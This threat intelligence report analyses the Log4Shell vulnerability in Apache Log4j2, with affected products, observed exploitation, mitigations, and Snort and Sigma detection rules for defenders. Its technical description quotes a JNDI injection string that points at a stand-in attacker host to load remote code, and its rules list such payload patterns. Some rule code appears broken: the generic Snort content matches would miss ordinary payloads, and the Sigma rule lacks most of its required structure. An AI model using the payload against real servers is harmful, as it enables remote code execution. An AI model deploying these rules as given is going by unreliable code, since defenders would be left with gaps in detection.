## Threat Intelligence Report: Apache Log4j2 Remote Code Execution (CVE-2021-44228)

**Report ID:** TIR-2021-44228-001
**Date Issued:** October 27, 2023
**Author:** Cyber Threat Intelligence Analyst Team

### 1. Executive Summary

This report provides a comprehensive analysis of **CVE-2021-44228**, critically known as "Log4Shell," a severe remote code execution (RCE) vulnerability affecting Apache Log4j2 versions 2.0-beta9 through 2.15.0 (excluding specific security releases). The vulnerability stems from Log4j2's JNDI features failing to protect against attacker-controlled LDAP and other JNDI-related endpoints. An attacker can achieve arbitrary code execution by injecting a specially crafted string into log messages or log message parameters if message lookup substitution is enabled.

Based on the provided Software Bill of Materials (SBOM), the component `org.apache.logging.log4j:log4j-core` version `2.14.1` is present. This version is confirmed to be directly vulnerable to CVE-2021-44228, posing a critical risk of full system compromise.

This vulnerability has been widely exploited by various threat actors, including nation-state groups, to deploy ransomware, establish backdoors, and gain initial access to target networks. Its ease of exploitation and widespread presence in Java applications make it a significant ongoing threat.

### 2. Vulnerability Details

**Vulnerability Name:** Apache Log4j2 Remote Code Execution (Log4Shell)
**CVE ID:** CVE-2021-44228
**Affected Component:** `org.apache.logging.log4j:log4j-core`
**Vulnerable Version:** `2.14.1` (as identified in SBOM)
**Vulnerable Range:** Apache Log4j2 2.0-beta9 through 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1).
**CVSS v3.1 Base Score:** 10.0 (Critical) - CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
**CVSS v2 Base Score:** 9.3 (High) - AV:N/AC:M/Au:N/C:C/I:C/A:C
**CWEs:** CWE-917 (Improper Neutralization of Special Elements used in an Expression Language Statement), CWE-502 (Deserialization of Untrusted Data), CWE-20 (Improper Input Validation), CWE-400 (Uncontrolled Resource Consumption).

**Technical Description:**
The Log4Shell vulnerability leverages the Java Naming and Directory Interface (JNDI) lookup feature present in Log4j2. When an application logs a user-controlled string containing a JNDI lookup (e.g., `${jndi:ldap://attacker.com/a}`), the Log4j2 library attempts to resolve this string. If the JNDI endpoint (e.g., LDAP server) is controlled by an attacker, it can serve a malicious Java class. The vulnerable Log4j2 instance will then download and execute this class, leading to Remote Code Execution (RCE) on the affected system. This is particularly dangerous as the injection can occur in various input fields that are later logged, such as HTTP headers (User-Agent, Referer), URL parameters, form data, or any application-specific input.

**Fixed Versions:**
*   Log4j 2.15.0: Disables JNDI lookup behavior by default.
*   Log4j 2.16.0 (and 2.12.2, 2.12.3, 2.3.1): Completely removes JNDI lookup functionality.

### 3. Affected Components & Systems

Based on the provided SBOM, the following component is identified:

*   **Component:** `log4j-core`
*   **Version:** `2.14.1`
*   **PURL:** `pkg:maven/org.apache.logging.log4j/log4j-core@2.14.1?packaging=jar`
*   **CPE:** `cpe:2.3:a:apache:log4j:2.14.1:*:*:*:*:*:*:*`

This component version is **directly vulnerable** to CVE-2021-44228.

**Impact on Identified Systems/Products (from context):**
The context highlights that Log4j2 is a widely used library. Specific products mentioned as potentially affected or having mitigations in place include:
*   **Jenkins:** Jenkins core is not affected, but plugins may be. Jenkins recommends disabling/uninstalling affected plugins. Web application containers hosting Jenkins (Tomcat, Websphere, Glassfish) should also be checked.
*   **SAP Applications:** Multiple SAP applications, including SAP HANA XSA, are affected. SAP has released patches (Note 3131047) and workarounds (Note 3129883).
*   **SUSE Linux Enterprise Products:** Log4j 2.x versions were affected and have received updates. Log4j 1.2.x, largely shipped by SUSE, is noted as not affected by CVE-2021-44228 but has its own set of EOL vulnerabilities (CVE-2019-17571, CVE-2020-9488, CVE-2021-4104, CVE-2022-23302, CVE-2022-23305, CVE-2022-23307).
*   **Red Hat Products:** Numerous Red Hat products (e.g., CodeReady Studio, Enterprise Application Platform, OpenShift, Data Grid, AMQ Streams) were affected and have received updates/advisories.
*   **AppDynamics Agents (Cisco):** Various AppDynamics agents (e.g., Apache Web Server Agent, Database Agent, Enterprise Console, Java Agent, Machine Agent, Node.js Agent, PHP Agent, Python Agent, ServiceNow Utility) were vulnerable and have fixed releases and mitigation steps.
*   **Atos HPC Products:** Several BullSequana series products are noted as "not impacted" or requiring specific checks for third-party tools/GPGPU configurations.

### 4. Threat Actor Activity & Exploitation

CVE-2021-44228 is a critical vulnerability that has been actively exploited in the wild since its disclosure.
*   **CISA's Known Exploited Vulnerabilities Catalog:** CVE-2021-44228 is included, underscoring its active and widespread exploitation.
*   **Threat Actors:** Multiple threat actors, including nation-state groups from China, Russia, Iran, and North Korea, have been observed exploiting this vulnerability.
*   **Observed Impact:** Exploitation has led to the deployment of ransomware payloads, establishment of persistent access (backdoors), and brokering of access to other threat actors. The broad attack surface of Log4j2 made it a prime target for initial access.

### 5. Recommendations

1.  **Immediate Patching/Upgrade:**
    *   Upgrade `log4j-core` from `2.14.1` to at least `2.16.0` (or later versions like 2.17.0, 2.17.1, 2.17.2, 2.19.0 as seen in patch references) for complete removal of the vulnerable JNDI lookup functionality.
    *   Prioritize patching systems that are internet-facing or handle untrusted input.

2.  **Mitigation (if immediate upgrade is not possible):**
    *   For Log4j2 versions 2.10.0 through 2.14.1, set the system property `log4j2.formatMsgNoLookups` to `true` or the environment variable `LOG4J_FORMAT_MSG_NO_LOOKUPS` to `true`.
    *   For Log4j2 versions 2.7.0 through 2.14.1, modify all `PatternLayout` patterns to specify the message converter as `%m{nolookups}` instead of just `%m`.
    *   For Log4j2 versions 2.0-beta9 through 2.10.0, remove the `JndiLookup.class` from the classpath: `zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class`.
    *   Ensure all mitigations are applied and verified, and that the application is restarted for changes to take effect.

3.  **Network Segmentation and Egress Filtering:**
    *   Isolate vulnerable systems where possible.
    *   Implement strict egress filtering to prevent vulnerable applications from initiating outbound connections (especially LDAP, RMI, DNS) to unknown or untrusted external IP addresses and ports, which could prevent callback for RCE.

4.  **Input Validation and Sanitization:**
    *   Implement robust input validation and sanitization for all user-controlled data, especially in fields that are processed by logging mechanisms. While this won't fix the underlying vulnerability, it reduces the attack surface.

5.  **Monitoring and Alerting:**
    *   Deploy detection rules (provided below) across network intrusion detection systems (NIDS), security information and event management (SIEM) systems, and endpoint detection and response (EDR) solutions.
    *   Monitor logs for unusual outbound connections from Java processes and unexpected process creations.

6.  **Software Inventory Management:**
    *   Maintain an up-to-date Software Bill of Materials (SBOM) to quickly identify vulnerable components across your environment.

### 6. Relevant Detection Rules

The following detection rules are provided as examples and may require tuning and adjustment based on your specific environment and logging configurations.

#### 6.1 Snort Rules (Network Intrusion Detection System)

Snort rules focus on detecting the JNDI lookup strings in network traffic, particularly within common HTTP headers and body content. Due to the high number of obfuscation techniques, it is challenging to cover all variations. These rules target common patterns.

```snort
# Basic JNDI LDAP lookup detection in HTTP requests (User-Agent, Referer, X-Forwarded-For)
alert http any any -> $HOME_NET any (msg:"Log4Shell - HTTP Header JNDI Lookup Detected (User-Agent)"; flow:established,to_server; http_header; content:"User-Agent|3A|"; pcre:"/User-Agent\x3A[^\n]*\$\{[^\}]*jndi\x3A(ldap|rmi|dns|nis|ndj|corba)\x3A/i"; classtype:attempted-admin; sid:20214422801;)
alert http any any -> $HOME_NET any (msg:"Log4Shell - HTTP Header JNDI Lookup Detected (Referer)"; flow:established,to_server; http_header; content:"Referer|3A|"; pcre:"/Referer\x3A[^\n]*\$\{[^\}]*jndi\x3A(ldap|rmi|dns|nis|ndj|corba)\x3A/i"; classtype:attempted-admin; sid:20214422802;)
alert http any any -> $HOME_NET any (msg:"Log4Shell - HTTP Header JNDI Lookup Detected (X-Forwarded-For)"; flow:established,to_server; http_header; content:"X-Forwarded-For|3A|"; pcre:"/X-Forwarded-For\x3A[^\n]*\$\{[^\}]*jndi\x3A(ldap|rmi|dns|nis|ndj|corba)\x3A/i"; classtype:attempted-admin; sid:20214422803;)
alert http any any -> $HOME_NET any (msg:"Log4Shell - HTTP Header JNDI Lookup Detected (Custom Header)"; flow:established,to_server; http_header; pcre:"/\$\{[^\}]*jndi\x3A(ldap|rmi|dns|nis|ndj|corba)\x3A/i"; classtype:attempted-admin; sid:20214422804;)

# Basic JNDI LDAP lookup detection in HTTP POST body
alert http any any -> $HOME_NET any (msg:"Log4Shell - HTTP POST Body JNDI Lookup Detected"; flow:established,to_server; http_method; content:"POST"; http_client_body; pcre:"/\$\{[^\}]*jndi\x3A(ldap|rmi|dns|nis|ndj|corba)\x3A/i"; classtype:attempted-admin; sid:20214422805;)

# Generic detection for JNDI lookup pattern (can be noisy)
alert tcp any any <> any any (msg:"Log4Shell - Generic JNDI Lookup Pattern"; content:"${jndi:|3A|"; pcre:"/\$\{[^\}]*jndi\x3A(ldap|rmi|dns|nis|ndj|corba)\x3A/i"; classtype:attempted-admin; sid:20214422806;)

# Detection for common obfuscation (e.g., lower/upper)
alert tcp any any <> any any (msg:"Log4Shell - Obfuscated JNDI Lookup Detected (lower/upper)"; content:"${|3A|"; pcre:"/\$\{(?:\s*|(?:\s*env|lower|upper|base64)\s*)\s*jndi\s*\x3A/i"; classtype:attempted-admin; sid:20214422807;)
```

#### 6.2 Sigma Rules (SIEM Generic Rules)

Sigma rules provide a generic format for SIEM systems. These rules target web server access logs and potential post-exploitation activities.

```yaml

references:
    - https://www.cisa.gov/uscert/apache-log4j-vulnerability-guidance
    - https://attack.mitre.org/techniques/T1190/

date: 2023/10/27

    category: webserver
    service: access_log

    selection_headers:

        http.referer|contains: ['${jndi:ldap://', '${jndi:rmi://', '${jndi:ldaps://', '${jndi:dns://', '${jndi:nis://', '${jndi:ndj://', '${jndi:corba://']
```
